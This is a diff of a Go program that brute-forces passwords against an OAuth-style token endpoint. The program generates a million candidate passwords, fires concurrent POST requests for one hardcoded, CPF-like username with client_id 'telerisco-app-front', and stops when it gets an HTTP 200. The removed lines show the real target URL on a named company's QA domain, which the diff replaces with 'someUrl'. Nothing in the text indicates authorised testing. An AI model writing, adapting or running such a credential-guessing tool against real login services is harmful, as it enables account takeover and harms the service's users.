@@ -27,12 +27,12 @@ type ResponseBruteForce struct {
 var m sync.Mutex
 
 func main() {
-	init := time.Now().UnixMilli()
+	start := time.Now().UnixMilli()
 	pagesChannel := make(chan *[]string)
-	responseChannel := make(chan *[]ResponseBruteForce)
+	responseChannel := make(chan ResponseBruteForce)
 
 	totalElements := 1_000_000
-	elementsPerPage := 500
+	elementsPerPage := 5_000
 	qtdPages := totalElements / elementsPerPage
 	fmt.Println(qtdPages)
 
@@ -48,7 +48,6 @@ func main() {
 		if end == totalElements {
 			end++
 		}
-		//fmt.Printf("Page: %d, start: %d, end: %d\n", i, start, end)
 		go populatePage(pagesChannel, start, end)
 	}
 
@@ -62,36 +61,41 @@ func main() {
 		pageSize := len(page)
 		totalSize += pageSize
 		fmt.Printf("Page '%d', size: %d\n", i, pageSize)
-		//for _, element := range page {
-		//	fmt.Printf("%s, ", element)
-		//}
-		//fmt.Println()
 	}
 	fmt.Printf("Total populated elements: %d\n", totalSize)
-	fmt.Printf("Total time in millis: %d ms\n", time.Now().UnixMilli()-init)
+	fmt.Printf("Total time in millis: %d ms\n", time.Now().UnixMilli()-start)
 
 	for _, page := range pages {
-		//fmt.Printf("Page: %d, elements: %v\n\n", i, page)
-		go bruteForce(&responseChannel, "64735569073", page)
+		username := "64735569073"
+		go bruteForce(responseChannel, username, page)
 	}
 
+	readChannel(pages, responseChannel, start)
+}
+
+func readChannel(pages [][]string, responseChannel <-chan ResponseBruteForce, start int64) {
 	count := 0
 	for i := 0; i < len(pages); i++ {
-		responses := <-responseChannel
-		for _, response := range *responses {
+		for j := 0; j < len(pages[i]); j++ {
+			response := <-responseChannel
 			count++
 			if response.StatusCode == 200 {
-				fmt.Printf("\n")
-				syscall.Exit(0)
+				fmt.Printf("%v\n", response)
+				end(count, start)
 			} else {
-				//fmt.Printf("Username: %s, password: %s, StatusCode: %d,\nBody: %v, Error: %v\n\n",
-				//	response.Username, response.Password, response.StatusCode, response.Body, response.Err)
-				fmt.Printf("%s\n", response.Password)
+				fmt.Printf("Username: %s, password: %s, StatusCode: %d,\nBody: %v, Error: %v\n\n",
+					response.Username, response.Password, response.StatusCode, response.Body, response.Err)
 			}
 		}
 	}
 	fmt.Printf("Total elements verify: %d\n\n", count)
-	fmt.Printf("Total time in minutes: %.3f m\n", float64(time.Now().UnixMilli()-init)/60_000.0)
+	fmt.Printf("Total time in minutes: %.3f m\n", float64(time.Now().UnixMilli()-start)/60_000)
+}
+
+func end(count int, start int64) {
+	fmt.Printf("Total elements verify: %d\n\n", count)
+	fmt.Printf("Total time in minutes: %.3f m\n", float64(time.Now().UnixMilli()-start)/60_000)
+	syscall.Exit(0)
 }
 
 func populatePage(channel chan *[]string, start int, end int) {
@@ -108,9 +112,8 @@ func appendPasswords(pagePasswords *[][]string, passwords *[]string) {
 	*pagePasswords = append(*pagePasswords, *passwords)
 }
 
-func bruteForce(channel *chan *[]ResponseBruteForce, username string, passwords []string) {
-	var responses []ResponseBruteForce
-	client := http.Client{}
+func bruteForce(channel chan<- ResponseBruteForce, username string, passwords []string) {
+	client := http.Client{Timeout: 3 * time.Minute}
 	data := url.Values{}
 	data.Set("username", username)
 	data.Set("client_id", "telerisco-app-front")
@@ -118,9 +121,10 @@ func bruteForce(channel *chan *[]ResponseBruteForce, username string, passwords 
 	for _, password := range passwords {
 		data.Set("password", password)
 		encodedData := data.Encode()
-		req, err := http.NewRequest("POST", "https://app-qa.telerisco.com.br/login-usuario/auth/token", strings.NewReader(encodedData))
+		endpoint := "someUrl"
+		req, err := http.NewRequest("POST", endpoint, strings.NewReader(encodedData))
 		if err != nil {
-			responses = append(responses, ResponseBruteForce{
+			channel <- ResponseBruteForce{
 				Err:        err,
 				StatusCode: 500,
 				Body:       "",
@@ -128,18 +132,23 @@ func bruteForce(channel *chan *[]ResponseBruteForce, username string, passwords 
 					Username: username,
 					Password: password,
 				},
-			})
+			}
 			continue
 		}
 		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 		req.Header.Add("Content-Length", strconv.Itoa(len(encodedData)))
-		responses = append(responses, callEndpoint(username, password, client, req))
+		response := callEndpoint(username, password, client, req)
+		//time.Sleep(1 * time.Millisecond)
+		channel <- response
+		if response.StatusCode == 200 {
+			break
+		}
 	}
-	*channel <- &responses
 }
 
 func callEndpoint(username string, password string, client http.Client, req *http.Request) ResponseBruteForce {
 	fmt.Printf("Request token: Username: %s, password: %s\n", username, password)
+	start := time.Now().UnixMilli()
 	response, err := client.Do(req)
 	if err != nil {
 		return ResponseBruteForce{
@@ -154,7 +163,8 @@ func callEndpoint(username string, password string, client http.Client, req *htt
 	}
 	defer func(Body io.ReadCloser) {
 		err := Body.Close()
-		fmt.Printf("Response token: Username: %s, password: %s, StatusCode: %d\n", username, password, response.StatusCode)
+		fmt.Printf("Response token: Username: %s, password: %s, StatusCode: %d, time: %dms\n",
+			username, password, response.StatusCode, time.Now().UnixMilli()-start)
 		if err != nil {
 			fmt.Printf("Error: %v\n", err)
 		}
